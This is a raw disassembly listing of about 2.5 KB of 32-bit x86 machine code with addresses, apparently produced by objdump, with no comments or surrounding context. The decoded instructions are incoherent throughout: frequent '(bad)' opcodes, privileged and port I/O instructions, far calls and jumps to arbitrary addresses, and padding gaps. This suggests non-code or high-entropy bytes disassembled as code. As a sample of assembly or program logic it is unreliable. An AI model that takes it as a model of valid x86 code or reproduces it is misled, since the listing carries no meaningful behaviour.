  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,WORD PTR [ebx+eax*1+0x600cbb5d]
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	mov    ebp,ecx
  42110e:	mov    cl,0xf2
  421110:	std    
  421111:	xor    BYTE PTR [ebp-0x6eb36ab9],0xd
  421118:	add    eax,0x17036b9e
  42111d:	cld    
  42111e:	xor    BYTE PTR [ebp-0x52],al
  421121:	pop    ebx
  421122:	dec    ebp
  421123:	mov    cl,0xaf
  421125:	pop    eax
  421126:	ins    DWORD PTR es:[edi],dx
  421127:	mov    dh,0x78
  421129:	xor    ch,ch
  42112b:	mov    esp,eax
  42112d:	pop    es
  42112e:	jne    0x421108
  421130:	rol    BYTE PTR [ecx],1
  421132:	pop    ebx
  421133:	(bad)  
  421134:	jecxz  0x421156
  421136:	icebp  
  421137:	cdq    
  421138:	int3   
  421139:	add    eax,0xea1a2c21
  42113e:	and    al,0x50
  421140:	daa    
  421141:	or     DWORD PTR [edx-0x55],esi
  421144:	(bad)  
  421145:	dec    esp
  421146:	inc    ecx
  421147:	sbb    BYTE PTR [ecx],dh
  421149:	mov    eax,0x39f88e2d
  42114e:	mov    ch,0x82
  421150:	jnp    0x4210ee
  421152:	adc    al,0x5b
  421154:	pop    esp
  421155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421156:	dec    edx
  421157:	jmp    0x421177
  421159:	fnsave [esi-0x34]
  42115c:	call   0x1287:0xf3bf379
  421163:	dec    ebp
  421164:	sbb    ch,al
  421166:	jmp    0xeefcaed
  42116b:	or     al,0x79
  42116d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42116e:	dec    esp
  42116f:	xor    cl,dl
  421171:	clc    
  421172:	pop    eax
  421173:	das    
  421174:	fmul   DWORD PTR [ebp+0x41bad8bf]
  42117a:	push   esi
  42117b:	shl    DWORD PTR [eax+0x5f375148],cl
  421181:	cdq    
  421182:	int    0x21
  421184:	call   0x2d5e5d1a
  421189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42118a:	inc    dh
  42118c:	les    ebx,FWORD PTR [esi-0x16]
  42118f:	stos   DWORD PTR es:[edi],eax
  421190:	or     DWORD PTR [ecx+0x39],esi
  421193:	push   ss
  421194:	xor    DWORD PTR [bx+si],0xffffff9a
  421198:	shr    BYTE PTR [eax+0x3a],cl
  42119b:	imul   esp,DWORD PTR [ebx],0xcb310af4
  4211a1:	sti    
  4211a2:	mov    ch,0xf2
  4211a4:	jmp    0x4211cb
  4211a6:	retf   0xa482
  4211a9:	xor    ecx,DWORD PTR [ebx-0x497ce573]
  4211af:	add    al,0x43
  4211b1:	test   al,0x9f
  4211b3:	ja     0x4211a4
  4211b5:	push   DWORD PTR [ecx+edi*4+0x78]
  4211b9:	bound  ebp,QWORD PTR [edi+0x12]
  4211bc:	(bad)  
  4211bd:	(bad)  
  4211be:	into   
  4211bf:	shr    BYTE PTR [edi+0x347414e0],cl
  4211c5:	adc    ah,al
  4211c7:	popa   
  4211c8:	fbld   TBYTE PTR [eax-0x1ebf381]
  4211ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211cf:	mov    eax,0xe1827193
  4211d4:	jns    0x42121a
  4211d6:	mov    DWORD PTR [eax],ebp
  4211d8:	imul   edi,DWORD PTR [edx-0x55],0x5d
  4211dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211dd:	fdivp  st(1),st
  4211df:	xor    ecx,ecx
  4211e1:	inc    esp
  4211e2:	xor    ecx,DWORD PTR [ebp+0x0]
  4211e5:	nop
  4211e6:	jb     0x421209
  4211e8:	or     al,cl
  4211ea:	rol    esp,1
  4211ec:	scas   al,BYTE PTR es:[edi]
  4211ed:	icebp  
  4211ee:	xor    al,0x85
  4211f0:	jmp    0xeac6:0x35a24855
  4211f7:	xor    bh,BYTE PTR [edx]
  4211f9:	pop    edi
  4211fa:	xor    ah,BYTE PTR [edx+0x7847faf]
  421200:	sub    al,0xd
  421202:	(bad)  
  421203:	int3   
  421204:	pop    es
  421205:	pop    esp
  421206:	out    0x9a,eax
  421208:	mov    ah,0x39
  42120a:	jb     0x4211db
  42120c:	adc    eax,0x7d2975
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x31b47ab3
  421282:	fcom   QWORD PTR [eax+edx*1+0x61]
  421286:	add    DWORD PTR [eax],eax
  421288:	add    al,0x1
  42128a:	add    BYTE PTR [eax],al
  42128c:	out    0x2f,eax
  42128e:	and    bl,dl
  421290:	push   cs
  421291:	mov    bh,0xd1
  421293:	and    BYTE PTR [ebp-0x3026cf96],0xc5
  42129a:	pop    esi
  42129b:	cmp    edi,DWORD PTR [esp+ebx*4+0x6dd9fb08]
  4212a2:	jne    0x4212e9
  4212a4:	sbb    edx,DWORD PTR [eax-0x2b]
  4212a7:	ins    DWORD PTR es:[edi],dx
  4212a8:	and    DWORD PTR [eax],esi
  4212aa:	xchg   ebp,eax
  4212ab:	shld   DWORD PTR [edi],esp,cl
  4212ae:	int3   
  4212af:	leave  
  4212b0:	or     BYTE PTR [edx+0x449f2147],0x3
  4212b7:	sub    bl,0x69
  4212ba:	stc    
  4212bb:	sahf   
  4212bc:	cmc    
  4212bd:	sti    
  4212be:	cwde   
  4212bf:	bound  edi,QWORD PTR [esi+0x9]
  4212c2:	test   eax,0x3a968e20
  4212c7:	or     al,0x50
  4212c9:	push   0xab35dd97
  4212ce:	cwde   
  4212cf:	lods   al,BYTE PTR ds:[esi]
  4212d0:	(bad)  
  4212d1:	mov    ah,BYTE PTR [eax+eiz*4-0x243b1d4f]
  4212d8:	jbe    0x421263
  4212da:	(bad)  
  4212db:	rcr    BYTE PTR [ebx],1
  4212dd:	je     0x421297
  4212df:	loope  0x42133d
  4212e1:	cmp    eax,0x1d274805
  4212e6:	cdq    
  4212e7:	pop    esp
  4212e8:	(bad)  
  4212e9:	xchg   esp,eax
  4212ea:	dec    esp
  4212eb:	inc    ecx
  4212ec:	and    DWORD PTR [edx],esi
  4212ee:	ret    0x7be
  4212f1:	fsub   st(5),st
  4212f3:	jmp    0x251b86d7
  4212f8:	(bad)  
  4212f9:	clc    
  4212fa:	xchg   edx,eax
  4212fb:	cli    
  4212fc:	fsub   QWORD PTR [ecx+0x5b]
  4212ff:	xchg   edx,eax
  421300:	sti    
  421301:	jns    0x421381
  421303:	out    0xa1,al
  421305:	pop    esp
  421306:	mov    edi,0x6efe8f71
  42130b:	sbb    al,0xe8
  42130d:	cdq    
  42130e:	mov    ch,0x3e
  421310:	div    esp
  421312:	daa    
  421313:	sbb    cl,ah
  421315:	pop    ecx
  421316:	jmp    esp
  421318:	push   ebx
  421319:	iret   
  42131a:	ss sbb eax,0x498c4159
  421320:	push   es
  421321:	icebp  
  421322:	jge    0x42130a
  421324:	dec    eax
  421325:	fisttp QWORD PTR [esi+ecx*1-0x3a]
  421329:	push   esp
  42132a:	or     al,0xbe
  42132c:	test   BYTE PTR [eax],dh
  42132e:	push   cs
  42132f:	xchg   DWORD PTR [esi],ebx
  421331:	jmp    0x421305
  421333:	sub    esp,DWORD PTR [edx-0x51e411c0]
  421339:	test   eax,edi
  42133b:	cmp    eax,edx
  42133d:	dec    esi
  42133e:	jge    0x421314
  421340:	pop    eax
  421341:	shl    BYTE PTR ds:0x5b52b3a7,0x2
  421348:	mov    ah,0x9d
  42134a:	aad    0x1e
  42134c:	jl     0x42139f
  42134e:	jmp    0x42138b
  421350:	push   eax
  421351:	xchg   esi,eax
  421352:	cmp    al,0x40
  421354:	jbe    0x4213b1
  421356:	mov    ch,cl
  421358:	dec    ecx
  421359:	and    BYTE PTR [ecx+0x77],bh
  42135c:	add    dl,BYTE PTR [edi]
  42135e:	fstp   DWORD PTR [esi+0x48]
  421361:	pop    esi
  421362:	cs mov ecx,0x4cd78d7
  421368:	loope  0x421381
  42136a:	int    0xee
  42136c:	into   
  42136d:	gs inc al
  421370:	cmc    
  421371:	cli    
  421372:	scas   al,BYTE PTR es:[edi]
  421373:	cwde   
  421374:	fmul   QWORD PTR [edi]
  421376:	mov    bl,0x4c
  421378:	sub    edx,DWORD PTR [edx-0x55]
  42137b:	fidivr WORD PTR [edx-0x1681c0ed]
  421381:	mov    dh,0x2e
  421383:	jmp    0x421305
  421385:	push   cs
  421386:	or     al,0x4d
  421388:	call   0x9f5d7c52
  42138d:	add    eax,0x70ca
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x1f8c0b61]
  421402:	cli    
  421403:	popa   
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	and    BYTE PTR [ebp+0x22],ah
  42140f:	push   esp
  421410:	iret   
  421411:	outs   dx,BYTE PTR ds:[esi]
  421412:	test   BYTE PTR [ebp-0x3b155e14],dl
  421418:	and    edi,DWORD PTR [ebx+0x5e]
  42141b:	mov    dh,0x49
  42141d:	cmp    eax,0x43eb391a
  421422:	mov    cl,0xd0
  421424:	mov    esp,DWORD PTR [ebp+0x1fe3629f]
  42142a:	cmp    esi,edi
  42142c:	aam    0xfc
  42142e:	jbe    0x421441
  421430:	mov    dh,0xa2
  421432:	dec    esi
  421433:	lods   eax,DWORD PTR ds:[esi]
  421434:	mov    dl,0xae
  421436:	ins    DWORD PTR es:[edi],dx
  421437:	cmp    al,0xc8
  421439:	in     eax,0xec
  42143b:	(bad)  
  42143c:	pop    esp
  42143d:	je     0x421447
  42143f:	cmp    BYTE PTR [edx],al
  421441:	les    eax,FWORD PTR [ecx]
  421443:	or     eax,0x150392ec
  421448:	in     eax,0x32
  42144a:	push   esi
  42144b:	jle    0x421486
  42144d:	cmp    eax,0x153af357
  421452:	mov    esi,0x19ab0f05
  421457:	cmp    ecx,DWORD PTR [ecx+0x6b8813ac]
  42145d:	loop   0x421489
  42145f:	jb     0x4214d6
  421461:	mov    BYTE PTR [ecx+ebp*1],bh
  421464:	fndisi(8087 only) 
  421466:	cdq    
  421467:	(bad)  
  421468:	lods   al,BYTE PTR ds:[esi]
  421469:	xchg   ecx,eax
  42146a:	cmc    
  42146b:	in     eax,dx
  42146c:	push   es
  42146d:	mov    bh,0x12
  42146f:	out    0x89,eax
  421471:	mov    al,ds:0xa02a5507
  421476:	add    ebp,esi
  421478:	xor    ebp,DWORD PTR [eax]
  42147a:	mov    ebx,0xfc67e374
  42147f:	xor    ebp,DWORD PTR [ecx-0x68]
  421482:	sub    DWORD PTR [esi],edx
  421484:	lods   eax,DWORD PTR ds:[esi]
  421485:	pop    edi
  421486:	sbb    al,0x8b
  421488:	mov    eax,ds:0x17575781
  42148d:	fdiv   QWORD PTR [ebp-0x4825cd83]
  421493:	and    dl,cl
  421495:	push   ss
  421496:	cdq    
  421497:	ret    
  421498:	js     0x421474
  42149a:	fwait
  42149b:	mov    ch,0x72
  42149d:	mov    dl,BYTE PTR [esi+0xa93381a]
  4214a3:	test   BYTE PTR ds:0x1e3be64f,ah
  4214a9:	sbb    ebp,ebp
  4214ab:	aaa    
  4214ac:	cld    
  4214ad:	mov    esp,DWORD PTR [ebp+edx*4+0x1]
  4214b1:	pop    ds
  4214b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214b3:	lock sbb DWORD PTR [esi+0x277e45],esp
  4214ba:	sar    ebx,1
  4214bc:	cmc    
  4214bd:	(bad)  
  4214be:	pushf  
  4214bf:	jle    0x421519
  4214c1:	pushf  
  4214c2:	inc    edx
  4214c3:	pop    es
  4214c4:	in     eax,dx
  4214c5:	dec    ebp
  4214c6:	mov    al,ds:0x16c7a34f
  4214cb:	push   esp
  4214cc:	sub    bh,BYTE PTR [edi-0x334eac50]
  4214d2:	dec    edx
  4214d3:	lds    eax,FWORD PTR [ebp-0x53]
  4214d6:	jne    0x42152e
  4214d8:	xchg   ebx,eax
  4214d9:	xchg   esp,eax
  4214da:	push   ebp
  4214db:	clc    
  4214dc:	loope  0x4214a7
  4214de:	mov    ecx,0xad52a6dc
  4214e3:	imul   ecx,DWORD PTR [edx-0x4576fdc8],0x16
  4214ea:	enter  0x63f6,0xfa
  4214ee:	dec    esp
  4214ef:	loop   0x421534
  4214f1:	clc    
  4214f2:	popa   
  4214f3:	dec    ecx
  4214f4:	push   0xffffffcd
  4214f6:	mov    bl,0xc2
  4214f8:	and    DWORD PTR [eax-0x4c639b09],esi
  4214fe:	mov    ecx,0x2f265bc5
  421503:	mov    ds:0xac693cd6,al
  421508:	ss dec ebp
  42150a:	push   edx
  42150b:	jge    0x42156f
  42150d:	test   al,0x52
  42150f:	sub    al,0x0
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x5325bd4c],bp
  421582:	and    al,ch
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	sti    
  42158d:	repz xor eax,0xec5a7efd
  421593:	ret    0x6bee
  421596:	dec    esp
  421597:	out    dx,eax
  421598:	mov    edx,0x52c0d043
  42159d:	push   esi
  42159e:	not    BYTE PTR [ecx-0x3c]
  4215a1:	xchg   ebp,eax
  4215a2:	sbb    eax,0xd163213b
  4215a7:	sbb    eax,0xabbbb0ff
  4215ac:	clc    
  4215ad:	dec    eax
  4215ae:	fs (bad) 
  4215b0:	repnz loop 0x4215b0
  4215b3:	inc    ecx
  4215b4:	jg     0x4215fc
  4215b6:	xchg   edi,eax
  4215b7:	and    ecx,DWORD PTR [edi-0x47]
  4215ba:	fild   WORD PTR [edi]
  4215bc:	sbb    eax,DWORD PTR [edx-0x66]
  4215bf:	cdq    
  4215c0:	push   esp
  4215c1:	and    cl,BYTE PTR [ebx-0x737c2c81]
  4215c7:	adc    DWORD PTR [esp+edx*8],edi
  4215ca:	scas   eax,DWORD PTR es:[edi]
  4215cb:	push   es
  4215cc:	bound  esi,QWORD PTR [ebx-0x52]
  4215cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215d0:	mov    bh,0x54
  4215d2:	mov    al,0xc4
  4215d4:	sbb    al,0x18
  4215d6:	out    dx,al
  4215d7:	stc    
  4215d8:	(bad)  
  4215d9:	xchg   edx,eax
  4215da:	pop    ebp
  4215db:	and    eax,0x4a913a60
  4215e0:	sub    ch,BYTE PTR [eax+ebp*8+0xb]
  4215e4:	imul   ebp,DWORD PTR [esi],0x4ad62d2f
  4215ea:	out    dx,eax
  4215eb:	mov    edx,0xa23c84ed
  4215f0:	aam    0xeb
  4215f2:	gs ins BYTE PTR es:[edi],dx
  4215f4:	leave  
  4215f5:	nop
  4215f6:	mov    ebp,0x97211d9f
  4215fb:	not    BYTE PTR [esp+edi*1]
  4215fe:	(bad)  
  4215ff:	adc    cl,BYTE PTR [ebx+esi*8-0x3fabf97d]
  421606:	cmp    al,0xdd
  421608:	dec    edi
  421609:	je     0x421617
  42160b:	arpl   bp,dx
  42160d:	repnz dec ebx
  42160f:	ins    BYTE PTR es:[edi],dx
  421610:	xor    bl,bh
  421612:	ret    
  421613:	cs jns 0x421628
  421616:	dec    esi
  421617:	fimul  DWORD PTR [edi-0xc]
  42161a:	mov    ebp,DWORD PTR [ebp+0x72ba9758]
  421620:	in     al,0xa4
  421622:	cmp    DWORD PTR [esi],eax
  421624:	pop    esi
  421625:	cmp    al,0x3a
  421627:	fld    DWORD PTR [ecx-0x5e]
  42162a:	lods   al,BYTE PTR ds:[esi]
  42162b:	dec    ebp
  42162c:	jle    0x421642
  42162e:	aam    0xc2
  421630:	adc    eax,DWORD PTR [esp+edx*1]
  421633:	out    dx,al
  421634:	inc    esp
  421635:	dec    ebx
  421636:	stos   BYTE PTR es:[edi],al
  421637:	mov    ch,0x2f
  421639:	sbb    DWORD PTR [ebp+ebx*8-0x589819ff],0xffffffce
  421641:	mov    ah,BYTE PTR [ebx-0x756c16ce]
  421647:	xor    ebp,eax
  421649:	js     0x4215f0
  42164b:	or     bh,cl
  42164d:	ficom  WORD PTR [edx-0x683a5fb0]
  421653:	mov    cl,0x80
  421655:	xchg   ecx,eax
  421656:	xor    edx,DWORD PTR [ebx+0x5c]
  421659:	pop    ebp
  42165a:	iret   
  42165b:	sbb    ch,0x23
  42165e:	add    bl,ah
  421660:	in     al,dx
  421661:	test   eax,0xbcd87508
  421666:	shl    DWORD PTR [eax+0x11],1
  421669:	das    
  42166a:	test   BYTE PTR [esp+edi*8+0x5dfc2448],dl
  421671:	imul   esi,DWORD PTR [esi-0x6dfa00ef],0xffffff9a
  421678:	xchg   edx,eax
  421679:	aad    0x15
  42167b:	and    eax,0x76feae98
  421680:	stos   BYTE PTR es:[edi],al
  421681:	ds jae 0x4216de
  421684:	push   ecx
  421685:	cmp    DWORD PTR [edx],esi
  421687:	cmp    cl,dl
  421689:	ret    0x68d7
  42168c:	mov    dl,0xac
  42168e:	repz add BYTE PTR es:[eax],al
	...
  4216f2:	add    BYTE PTR [eax],al
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	mov    eax,DWORD PTR [eax+0x60]
  421703:	xchg   edi,eax
  421704:	sbb    al,0x64
  421706:	add    DWORD PTR [eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	push   ss
  42170d:	xor    eax,0x48b962ae
  421712:	or     eax,0xaf723a8e
  421717:	fnstenv [ecx]
  421719:	mov    WORD PTR [eax],fs
  42171b:	rcl    DWORD PTR [eax],0x38
  42171e:	mov    fs,ebx
  421720:	mov    ds:0x5a596431,al
  421725:	ret    0xed1c
  421728:	push   es
  421729:	mov    eax,db6
  42172c:	scas   eax,DWORD PTR es:[edi]
  42172d:	sub    DWORD PTR [ebx],0xffffffc9
  421730:	repnz xchg ebp,eax
  421732:	sub    eax,0x4d491306
  421737:	xor    BYTE PTR [esi],dh
  421739:	int3   
  42173a:	call   0xc69b06d7
  42173f:	stos   DWORD PTR es:[edi],eax
  421740:	sub    bl,BYTE PTR [edx]
  421742:	in     eax,dx
  421743:	push   edi
  421744:	(bad)  
  421746:	jo     0x42176f
  421748:	jg     0x421763
  42174a:	repnz scas eax,DWORD PTR es:[edi]
  42174c:	dec    ebp
  42174d:	(bad)  
  42174e:	fstp   DWORD PTR [esi]
  421750:	sub    eax,0x6770db13
  421755:	jns    0x4217a5
  421757:	mov    ebp,0xc21b96fe
  42175c:	dec    ebp
  42175d:	or     eax,DWORD PTR [esi+0x5f]
  421760:	pushf  
  421761:	adc    eax,0x994925aa
  421766:	test   eax,0xc66939ee
  42176b:	or     DWORD PTR [ebx-0x10],0x43
  42176f:	mov    WORD PTR [ebx+edx*4-0x14],fs
  421773:	adc    al,0x76
  421775:	mov    eax,0x681cd91d
  42177a:	xor    dh,BYTE PTR [edx-0x38]
  42177d:	loopne 0x421779
  42177f:	in     eax,0xbc
  421781:	jb     0x42174c
  421783:	mov    edx,0xf4e0e4cc
  421788:	xor    eax,0x6f11da09
  42178d:	xchg   esp,eax
  42178e:	pop    esi
  42178f:	iret   
  421790:	cmp    al,0x77
  421792:	cs mov bh,0x71
  421795:	je     0x421806
  421797:	cmc    
  421798:	xor    cl,BYTE PTR [edx+0x52]
  42179b:	ret    
  42179c:	or     BYTE PTR [ebx],0x2a
  42179f:	dec    eax
  4217a0:	iret   
  4217a1:	rol    DWORD PTR [eax],cl
  4217a3:	jp     0x4217a9
  4217a5:	ja     0x4217a9
  4217a7:	iret   
  4217a8:	or     eax,0xb531748f
  4217ad:	mov    ds,WORD PTR [ecx+ebp*2+0x25]
  4217b1:	stc    
  4217b2:	push   eax
  4217b3:	jns    0x421823
  4217b5:	adc    bh,BYTE PTR [edi+0x53686565]
  4217bb:	xor    eax,0x81953e97
  4217c0:	sub    DWORD PTR [esi-0x56],ebp
  4217c3:	add    al,0xf2
  4217c5:	cld    
  4217c6:	in     eax,0x41
  4217c8:	arpl   WORD PTR [ebp-0x50620d14],si
  4217ce:	les    ebx,FWORD PTR [edx+0x7b]
  4217d1:	loope  0x42182b
  4217d3:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4217d5:	repnz push ss
  4217d7:	cli    
  4217d8:	aad    0x79
  4217da:	cwde   
  4217db:	les    ecx,FWORD PTR [ecx-0x1c221496]
  4217e1:	mov    cl,0xe6
  4217e3:	add    dh,BYTE PTR [edx+0x54a0b07b]
  4217e9:	enter  0x8c5,0xc0
  4217ed:	stos   BYTE PTR es:[edi],al
  4217ee:	in     al,0xa6
  4217f0:	aaa    
  4217f1:	addr16 shl ch,1
  4217f4:	sub    bl,al
  4217f6:	shl    DWORD PTR [ebx+ecx*1-0x27],0x56
  4217fb:	fcom   QWORD PTR [eax]
  4217fd:	(bad)  
  4217fe:	pop    DWORD PTR ds:0x63bb4f5e
  421804:	mov    ebp,0x574e39bc
  421809:	in     eax,dx
  42180a:	(bad)  
  42180b:	jb     0x42181e
  42180d:	add    eax,0xe508
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	scas   eax,DWORD PTR es:[edi]
  421881:	ror    BYTE PTR [ebx+0x25],1
  421884:	and    BYTE PTR [ebp+0x1],ah
  421887:	add    BYTE PTR [ecx+eax*1],al
  42188a:	add    BYTE PTR [eax],al
  42188c:	sbb    ah,BYTE PTR [esi+0x71]
  42188f:	(bad)  
  421890:	daa    
  421891:	mov    BYTE PTR [ecx-0x7f083052],bl
  421897:	repz cmp eax,0x2d97480d
  42189d:	ins    BYTE PTR es:[edi],dx
  42189e:	jo     0x42189c
  4218a0:	xor    DWORD PTR [edi+0x57017d43],0x12
  4218a7:	pop    esp
  4218a8:	mov    WORD PTR [esi-0x5b],fs
  4218ab:	aam    0xee
  4218ad:	(bad)  
  4218ae:	leave  
  4218af:	cmp    al,0x8e
  4218b1:	mov    dh,0x4b
  4218b3:	add    BYTE PTR [edi+0x77b229ba],0xe4
  4218ba:	sbb    eax,0xde844256
  4218bf:	bnd jmp 0xebe31085
  4218c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218c6:	add    bl,bh
  4218c8:	mov    WORD PTR [esi+0x4d],fs
  4218cb:	cli    
  4218cc:	cmp    al,0x55
  4218ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218cf:	test   eax,0x24a1c57e
  4218d4:	xchg   edx,eax
  4218d5:	into   
  4218d6:	dec    edi
  4218d7:	test   DWORD PTR [esp+edx*1+0x1883192b],ebp
  4218de:	ja     0x4218fd
  4218e0:	jp     0x4218a2
  4218e2:	jns    0x42195d
  4218e4:	push   ecx
  4218e5:	ds xchg ecx,eax
  4218e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218e8:	ret    
  4218e9:	pop    ecx
  4218ea:	mov    ch,0xff
  4218ec:	enter  0xb16f,0x97
  4218f0:	pop    eax
  4218f1:	sar    BYTE PTR [edi-0x485c775b],0xb5
  4218f8:	push   es
  4218f9:	sbb    eax,0x667b59f6
  4218fe:	(bad)
  421901:	sbb    DWORD PTR [ecx],eax
  421903:	xchg   esp,eax
  421904:	outs   dx,DWORD PTR ds:[esi]
  421905:	push   esp
  421906:	(bad)  
  421907:	jg     0x4218a4
  421909:	stos   DWORD PTR es:[edi],eax
  42190a:	mov    dh,0x98
  42190c:	xor    bl,0x79
  42190f:	fadd   st(3),st
  421911:	or     bh,BYTE PTR [ebx-0x7ec9dc87]
  421917:	int3   
  421918:	or     ch,dh
  42191a:	rcr    BYTE PTR [edi-0x6d],cl
  42191d:	jns    0x421976
  42191f:	ins    DWORD PTR es:[edi],dx
  421920:	out    dx,eax
  421921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421922:	mov    WORD PTR [ebp-0x2e],?
  421925:	call   DWORD PTR [ecx+0x44ba86c4]
  42192b:	sbb    ch,BYTE PTR [eax+ebp*4+0x663386dc]
  421932:	fdivr  DWORD PTR [ecx]
  421934:	xchg   DWORD PTR [edi+0x72a000],edi
  42193a:	jl     0x42194b
  42193c:	xor    cl,BYTE PTR [esi+0x546e5abc]
  421942:	popa   
  421943:	lods   eax,DWORD PTR ds:[esi]
  421944:	jne    0x4218ee
  421946:	popa   
  421947:	adc    al,0x23
  421949:	inc    ebp
  42194a:	into   
  42194b:	dec    eax
  42194c:	clc    
  42194d:	jns    0x421998
  42194f:	inc    ebp
  421950:	pop    ss
  421951:	imul   edx,DWORD PTR [esp+esi*4],0xf558f919
  421958:	xor    DWORD PTR [edi],0x4e
  42195b:	data16 or cl,BYTE PTR [eax-0x6e1405b6]
  421962:	mov    ch,0x21
  421964:	push   eax
  421965:	call   0xd540954f
  42196a:	sub    eax,0xa1abe1f6
  42196f:	pusha  
  421970:	add    DWORD PTR [edi],ebp
  421972:	pop    edx
  421973:	fcom   QWORD PTR [edx-0x52]
  421976:	es icebp 
  421978:	fidivr DWORD PTR [edi+eax*2-0x3c5af563]
  42197f:	inc    ebp
  421980:	fimul  WORD PTR [esi*1-0x27656ac7]
  421987:	cmp    eax,0x1464ac82
  42198c:	fmul   st(0),st
  42198e:	mov    ah,0x6f
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	fs push edi
  421a02:	adc    eax,0x166246b
  421a07:	add    BYTE PTR [ecx+eax*1],al
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	ret    0x5ab6
  421a0f:	popa   
  421a10:	arpl   WORD PTR fs:[edi+0x73d2d3f7],si
  421a17:	inc    ecx
  421a18:	inc    ebx
  421a19:	dec    esp
  421a1a:	test   esp,edx
  421a1c:	mov    edi,0x92024c5
  421a21:	adc    esp,eax
  421a23:	xchg   esp,eax
  421a24:	jne    0x421a3e
  421a26:	(bad)  
  421a27:	or     edi,eax
  421a29:	retf   
  421a2a:	enter  0x734d,0xed
  421a2e:	sahf   
  421a2f:	mul    DWORD PTR [edi-0x6e1e74bf]
  421a35:	push   ebp
  421a36:	push   edx
  421a37:	loope  0x421a91
  421a39:	or     al,0xff
  421a3b:	(bad)  
  421a3c:	xchg   edx,eax
  421a3d:	(bad)  
  421a3f:	mov    ds:0x2e76ce8b,eax
  421a44:	sbb    DWORD PTR [edx],edx
  421a46:	aad    0x97
  421a48:	and    eax,0xa4b09fc4
  421a4d:	test   al,0x62
  421a4f:	sbb    esp,DWORD PTR ds:0x19b09f84
  421a55:	cli    
  421a56:	push   0x9
  421a58:	adc    al,0xb6
  421a5a:	pop    ds
  421a5b:	jp     0x421a50
  421a5d:	lods   eax,DWORD PTR ds:[esi]
  421a5e:	jecxz  0x421a15
  421a60:	jl     0x421ad2
  421a62:	sar    BYTE PTR ds:0xb0a375de,1
  421a68:	inc    ecx
  421a69:	fst    QWORD PTR [edx-0x6a]
  421a6c:	sbb    edi,DWORD PTR [eax]
  421a6e:	pop    edx
  421a6f:	popf   
  421a70:	sub    al,0x60
  421a72:	js     0x421abf
  421a74:	xchg   edi,eax
  421a75:	cmp    al,0xbc
  421a77:	not    BYTE PTR [eax-0x48b6073c]
  421a7d:	xchg   esp,eax
  421a7e:	test   ebx,0x45ee6653
  421a84:	dec    bx
  421a86:	pop    ds
  421a87:	repnz cwde 
  421a89:	or     DWORD PTR [ebp+eiz*2-0x63278bef],esp
  421a90:	popa   
  421a91:	call   FWORD PTR [ebx-0x3a]
  421a94:	(bad)
  421a98:	xor    eax,0x2ebe2c22
  421a9d:	mov    BYTE PTR [edx-0x149097d8],al
  421aa3:	inc    ebp
  421aa4:	into   
  421aa5:	sbb    esp,DWORD PTR [edx+0x463c561f]
  421aab:	pop    ecx
  421aac:	call   0x817:0xb3748b3d
  421ab3:	rol    BYTE PTR [ebx-0x55],cl
  421ab6:	in     eax,dx
  421ab7:	cmp    edx,DWORD PTR [ebx+0x4]
  421aba:	les    edx,FWORD PTR [edi+0x10]
  421abd:	jbe    0x421a7e
  421abf:	outs   dx,BYTE PTR ds:[esi]
  421ac0:	push   0x22
  421ac2:	sub    cl,BYTE PTR [ebp-0x7b868199]
  421ac8:	fcomi  st,st(7)
  421aca:	leave  
  421acb:	bound  edi,QWORD PTR [esi]
  421acd:	jns    0x421a76
  421acf:	mov    ds:0xaa68d68f,eax
  421ad4:	fdiv   st(6),st
  421ad6:	inc    ecx
  421ad7:	(bad)  
  421ad8:	int    0x8d
  421ada:	mov    esi,0x4cfe7b4a
  421adf:	inc    ecx
  421ae0:	es pop eax
  421ae2:	add    eax,0x63b356b2
  421ae7:	sub    ebp,ebx
  421ae9:	aad    0x86
  421aeb:	test   eax,0x6e25a492
  421af0:	test   al,0x9a
  421af2:	or     ah,BYTE PTR [edx]
  421af4:	sbb    eax,0xfa627ce
  421af9:	lahf   
  421afa:	inc    edx
  421afb:	into   
